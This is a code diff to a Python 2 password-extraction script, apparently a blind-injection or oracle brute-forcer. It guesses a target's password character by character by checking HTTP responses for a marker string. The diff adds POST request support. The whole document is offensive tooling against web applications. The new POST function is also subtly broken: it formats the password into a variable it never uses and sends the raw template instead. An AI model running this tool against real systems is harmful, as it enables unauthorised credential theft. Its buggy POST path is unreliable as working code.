@@ -11,10 +11,23 @@ chars_specials = [ ',', '?', ';', '.', ':', '/', '!', '%', '*',  '$', '"', '\'',
 chars = []
 verbose = False
 
-# Checks a single password and tell if it's correct or not
-def test(url, string, password):
+def test(url, string, password, data):
+	if len(data) == 0:
+		return test_get(url, string, password)
+	return test_post(url, string, password, data)
+
+# Checks a single password and tell if it's correct or not - GET version
+def test_get(url, string, password):
 	query = url.format(password)
 	response = urllib2.urlopen(query)
+	content = response.read()
+	return string in content
+
+# Checks a single password and tell if it's correct or not - POST version
+def test_post(url, string, password, data):
+	query = url.format(password)
+	prepared_data = data.format(password)
+	response = urllib2.urlopen(query, data)
 	content = response.read()
 	return string in content
 
@@ -41,13 +54,13 @@ def prepare(order):
 	return True
 
 # Loop bruteforcing each character of password
-def find(url, string, seed):
+def find(url, string, seed, data):
 	for char in chars:
 		newseed = seed + char
 		debug("* Testing character {}. Password is {}".format(char, newseed))
-		if test(url, string, newseed):
+		if test(url, string, newseed, data):
 			print("* Character found : {}, password is {}".format(char, newseed))
-			find(url, string, newseed)
+			find(url, string, newseed, data)
 			return
 	print "* ---"
 	print "* Password found : {}".format(seed)
@@ -59,9 +72,10 @@ def debug(string):
 
 # Options parser
 parser = OptionParser()
-parser.add_option("-u", dest="url", help="URL with payload. Replace password with {}")
+parser.add_option("-u", dest="url", help="Target URL. {} will be replaced with the password")
 parser.add_option("-s", dest="string", help="String to look for in response to check whether tested password fragment is correct")
 parser.add_option("-v", dest="verbose", action="store_true", help="Verbose mode", default=False)
+parser.add_option("--data", dest="data", help="Data to be sent to server. {} will be replaced with the password. Will use POST requests if provided", default="")
 parser.add_option("--seed", dest="seed", help="Starting password fragment. Will start with an empty password if this option isn't provided", default="")
 parser.add_option("--chars", dest="characters", help="Characters pool and order ((L)ow, (U)p, (D)igits, (S)pecials). Default to DLUS if this options isn't provided", default="DLUS")
 (options, args) = parser.parse_args()
@@ -74,4 +88,4 @@ verbose = options.verbose
 
 # Go
 if prepare(options.characters):
-	find(options.url, options.string, options.seed)
+	find(options.url, options.string, options.seed, options.data)
